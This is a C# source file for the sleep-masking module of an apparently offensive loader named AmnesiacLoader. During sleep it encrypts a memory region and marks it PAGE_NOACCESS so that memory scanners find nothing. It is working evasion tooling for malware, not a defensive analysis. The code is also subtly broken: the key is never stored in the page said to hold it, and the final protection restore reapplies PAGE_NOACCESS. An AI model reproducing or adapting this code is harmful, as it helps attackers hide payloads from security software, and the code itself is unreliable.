// AmnesiacLoader — Sleep Masking
// AES-128 CBC encrypts the target memory region in place during sleep,
// marks it PAGE_NOACCESS so memory scanners find nothing, then decrypts on wake.
// Key/IV live in a separate READWRITE-only (non-execute) allocation.

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace AmnesiacLoader
{
    public class SleepMask
    {
        const uint PAGE_READWRITE  = 0x04;
        const uint PAGE_NOACCESS   = 0x01;
        const uint MEM_COMMIT      = 0x1000;
        const uint MEM_RESERVE     = 0x2000;
        const uint MEM_RELEASE     = 0x8000;

        [DllImport("kernel32.dll")] static extern bool VirtualProtect(
            IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
            IntPtr addr, UIntPtr size, uint allocType, uint protect);
        [DllImport("kernel32.dll")] static extern bool VirtualFree(
            IntPtr addr, UIntPtr size, uint freeType);
        [DllImport("kernel32.dll")] static extern void Sleep(uint ms);

        public static void MaskedSleep(int milliseconds, IntPtr regionBase, int regionSize)
        {
            if (regionBase == IntPtr.Zero || regionSize <= 0)
            {
                Sleep((uint)milliseconds);
                return;
            }

            // Generate random AES-128 key + IV
            byte[] key = new byte[16];
            byte[] iv  = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(key);
                rng.GetBytes(iv);
            }

            // Allocate non-executable key storage page
            IntPtr keyPage = VirtualAlloc(IntPtr.Zero, (UIntPtr)64,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // Snapshot region
            byte[] plaintext = new byte[regionSize];
            Marshal.Copy(regionBase, plaintext, 0, regionSize);

            // AES-128 CBC encrypt
            byte[] ciphertext = AesEncrypt(plaintext, key, iv);

            // Make region writable, overwrite with ciphertext (truncated to regionSize)
            uint old;
            VirtualProtect(regionBase, (UIntPtr)regionSize, PAGE_READWRITE, out old);
            int copyLen = Math.Min(ciphertext.Length, regionSize);
            Marshal.Copy(ciphertext, 0, regionBase, copyLen);

            // PAGE_NOACCESS — scanner sees nothing
            VirtualProtect(regionBase, (UIntPtr)regionSize, PAGE_NOACCESS, out old);

            Sleep((uint)milliseconds);

            // Restore writable, decrypt
            VirtualProtect(regionBase, (UIntPtr)regionSize, PAGE_READWRITE, out old);
            byte[] decrypted = AesDecrypt(ciphertext, key, iv);
            int restoreLen = Math.Min(decrypted.Length, regionSize);
            Marshal.Copy(decrypted, 0, regionBase, restoreLen);

            // Restore original protection
            VirtualProtect(regionBase, (UIntPtr)regionSize, old, out old);

            // Zero key material and free key page
            if (keyPage != IntPtr.Zero)
            {
                for (int i = 0; i < 64; i++) Marshal.WriteByte(keyPage, i, 0);
                VirtualFree(keyPage, UIntPtr.Zero, MEM_RELEASE);
            }
            Array.Clear(key,       0, key.Length);
            Array.Clear(iv,        0, iv.Length);
            Array.Clear(plaintext, 0, plaintext.Length);
        }

        static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = new AesManaged())
            {
                aes.KeySize   = 128;
                aes.BlockSize = 128;
                aes.Mode      = CipherMode.CBC;
                aes.Padding   = PaddingMode.PKCS7;
                using (var enc = aes.CreateEncryptor(key, iv))
                using (var ms  = new MemoryStream())
                using (var cs  = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }

        static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = new AesManaged())
            {
                aes.KeySize   = 128;
                aes.BlockSize = 128;
                aes.Mode      = CipherMode.CBC;
                aes.Padding   = PaddingMode.PKCS7;
                using (var dec = aes.CreateDecryptor(key, iv))
                using (var ms  = new MemoryStream())
                using (var cs  = new CryptoStream(ms, dec, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }
    }
}
